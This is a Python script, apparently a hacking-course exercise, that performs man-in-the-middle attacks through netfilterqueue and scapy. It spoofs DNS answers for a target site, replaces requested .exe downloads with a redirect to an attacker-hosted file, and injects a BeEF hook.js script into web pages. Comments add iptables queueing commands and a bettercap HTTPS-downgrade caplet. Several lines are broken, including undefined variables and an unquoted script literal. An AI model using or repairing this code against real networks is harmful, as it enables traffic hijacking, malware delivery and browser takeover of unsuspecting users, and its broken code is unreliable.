#!/usr/bin/env python
#DNS spoofing project to intercept and alter packets
#Linux command: python DNS_spoofing.py
#Configure a DNS server on maching, modify IP address, or forward request/modify response.
#Find the A record --> rdata (raw data) for the specific website (qname)
#seq and ack reconciliation
#Better Cap plug-in to downgrade HTTPS to HTTP: bettercap -iface eth0 -caplet hstshijack/hstshijack
#BeEF = template for malware
#Linux Command: iptables -I INPUT -j NFQUEUE --queue-num 0
#Linux Command: iptables -I OUTPUT -j NFQUEUE --queue-num 0

import netfilterqueue
import scapy.all as scapy
import re

ack_list = [] #file_override will add to the list
def process_packet(packet):
    hacked_packet = scapy.IP(packet.get_payload())
    if hacked_packet.haslayer(scapy.DNSRR):
        website_name = hacked_packet[scapy.DNSQR].qname
        if "www.website.com" in website_name.decode():
            answer = scapy.DNSRR(rrname=qname, rdata="NEW IP ADDRESS")
            hacked_packet[scapy.DNS].an = answer
            hacked_packet[scapy.DNS].ancount = 1
            del hacked_packet[scapy.IP].len
            del hacked_packet[scapy.IP].chksum
            del hacked_packet[scapy.UDP].len
            del hacked_packet[scapy.UDP].chksum

            packet.set_payload(bytes(hacked_packet))

        #print(hacked_packet.show()) #print first to visualize IP
        #Linux Command: ping -c 1 www.website.com --> IP of website.com
    packet.accept()

def file_override(packet):
    hacked_packet = scapy.IP(packet.get_payload())
    if hacked_packet.haslayer(scapy.Raw):
        # print(hacked_packet.show()) #print first to visualize RAW layer
        if hacked_packet[scapy.TCP].dport == 80: #request, port 8080 if HTTPS
            if b".exe" in hacked_packet[scapy.Raw].load: #and b(byte) "IP ADDRESS" not in hacked_packet[scapy.Raw].load:
                ack_list.append(hacked_packet[scapy.TCP].ack)
            #print(hacked_packet.show())
        elif hacked_packet[scapy.TCP].sport == 80: #port 8080 if HTTPS
            if hacked_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(hacked_packet[scapy.TCP].seq)
                hacked_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently \nLocation: https://www.WEBSITE OR IP ADDRESS.com/files.exe"
                del hacked_packet[scapy.IP].len
                del hacked_packet[scapy.IP].chksum
                del hacked_packet[scapy.TCP].chksum
                packet.set_payload(bytes(hacked_packet))
            #print(hacked_packet.show())
    packet.accept()

def beef_hack(packet):
    hacked_packet = scapy.IP(packet.get_payload())
    if hacked_packet.haslayer(scapy.Raw):
        # print(hacked_packet.show()) #print first to visualize RAW layer
        if hacked_packet[scapy.TCP].dport == 80: #request, 8080 if HTTPS
            load = re.sub("Accept-Encoding:.*?\\r\n", "", load)
            #print(hacked_packet.show())
        elif hacked_packet[scapy.TCP].sport == 80: #8080 if HTTPS
            # print(hacked_packet.show())
            beef_code = <script src="http://0.0.0.0:3000/hook.js"></script>
            load = load.replace("</body>" , beef_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                packet.set_payload(bytes(hacked_packet))
        if load != hacked_packet[scapy.Raw].load:
            new_packet = set_load(hacked_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet) #OR file_override OR beef_hack
queue.run




